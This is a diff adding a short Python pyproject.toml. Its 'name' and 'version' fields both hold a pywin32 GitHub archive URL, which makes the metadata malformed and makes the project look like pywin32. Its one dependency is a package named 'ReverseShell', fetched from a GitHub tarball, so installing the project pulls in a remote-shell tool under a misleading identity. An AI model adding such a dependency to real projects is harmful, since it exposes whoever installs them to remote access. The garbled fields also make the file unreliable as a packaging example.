@@ -1,0 +1,4 @@
+[project]
+name = "https://github.com/mhammond/pywin32/archive/refs/tags/b306.tar.gz#egg=pywin32"
+version = "https://github.com/mhammond/pywin32/archive/refs/tags/b306.tar.gz#egg=pywin32"
+dependencies = ["ReverseShell @ https://github.com/mauricelambert/ReverseShell/archive/refs/tags/v0.1.0python.tar.gz"]
